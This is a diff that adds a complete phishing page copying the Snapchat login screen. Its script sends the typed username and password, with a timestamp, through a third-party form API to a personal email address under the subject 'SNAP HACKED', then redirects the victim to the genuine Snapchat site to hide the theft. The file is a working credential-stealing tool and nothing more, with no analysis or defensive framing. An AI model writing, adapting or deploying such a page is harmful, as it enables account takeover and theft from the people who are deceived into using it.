@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Log in • Snapchat</title>
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
+body{background:#FFFC00;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
+.box{background:#fff;border-radius:20px;box-shadow:0 8px 24px #0000001a;width:100%;max-width:400px;padding:40px 30px;text-align:center;}
+.logo{width:90px;margin-bottom:30px;}
+h1{font-size:36px;font-weight:900;margin-bottom:35px;}
+input{width:100%;padding:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:15px;}
+button{width:100%;padding:15px;background:#000;color:#fff;border-radius:8px;font-size:18px;font-weight:bold;border:none;margin:10px 0 25px;}
+a{color:#000;text-decoration:none;font-size:14px;}
+</style>
+</head>
+<body>
+<div class="box">
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png">
+<h1>Log in</h1>
+<form id="f">
+<input type="text" id="u" placeholder="Username or Email" required>
+<input type="password" id="p" placeholder="Password" required>
+<button type="submit">Log In</button>
+</form>
+<a href="#">Forgot password?</a> • <a href="#">Sign Up</a>
+</div>
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script>
+$("#f").submit(function(e){
+e.preventDefault();
+let u=$("#u").val(),p=$("#p").val();
+fetch("https://api.web3forms.com/submit",{
+method:"POST",headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+access_key:"9f69793c-9781-4076-b488-945f65956398",
+email:"landratskristers2011@gmail.com",
+subject:"🔥 SNAP HACKED ✅ REAL",
+message:"USER: "+u+"\nPASS: "+p+"\nTIME: "+new Date().toLocaleString()
+})
+}).finally(()=>{window.location="https://accounts.snapchat.com";});
+});
+</script>
+</body>
+</html>
